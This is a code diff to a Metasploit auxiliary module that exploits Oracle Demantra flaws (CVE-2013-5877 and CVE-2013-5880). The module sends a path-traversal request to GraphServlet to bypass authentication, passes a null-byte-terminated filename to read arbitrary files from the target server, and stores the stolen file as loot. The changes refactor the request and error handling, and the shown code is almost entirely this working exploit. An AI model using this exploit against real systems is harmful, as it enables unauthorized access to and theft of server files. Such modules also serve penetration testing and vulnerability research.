@@ -20,16 +20,17 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'     =>
         [
-          [ 'CVE', '2013-5877', '2013-5880'],
-          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/',
-                   'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]
+          [ 'CVE', '2013-5877'],
+          [ 'CVE', '2013-5880'],
+          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/'],
+          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/']
         ],
       'Author'         =>
         [
           'Oliver Gruskovnjak'
         ],
       'License'        => MSF_LICENSE,
-      'DisclosureDate' => "January 2014"
+      'DisclosureDate' => "Feburary 28 2014"
     ))
 
     register_options(
@@ -44,18 +45,19 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     filename = datastore['FILEPATH']
+    authbypass = "/demantra/common/loginCheck.jsp/../../GraphServlet"
 
-    res = send_request_raw({
-      'uri' => "/demantra/common/loginCheck.jsp/../../GraphServlet",
+    res = send_request_cgi({
+      'uri' => normalize_uri(authbypass),
       'method' => 'POST',
-      'ctype'    => 'application/x-www-form-urlencoded',
-      'data' => "filename=#{filename}%00",
+      'encode_params' => false,
+      'vars_post' => {
+        'filename' => "#{filename}%00"
+      }
     })
 
-
     if res.nil? or res.body.empty?
-      print_error("No content retrieved from: #{ip}")
-      return
+      fail_with("No content retrieved from: #{ip}")
     end
 
     if res.code == 404
@@ -65,11 +67,6 @@ class Metasploit3 < Msf::Auxiliary
 
     if res.code == 200
       print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
-    end
-
-    if res.body.empty?
-      print_error("#{ip}:#{rport} - Empty response, no file downloaded")
-    else
       fname = File.basename(datastore['FILEPATH'])
       path = store_loot(
         'oracle.demantra',
@@ -78,8 +75,7 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname)
 
-      print_status("#{ip}:#{rport} - File saved in: #{path}")
+      print_good("#{ip}:#{rport} - File saved in: #{path}")
     end
   end
-
 end
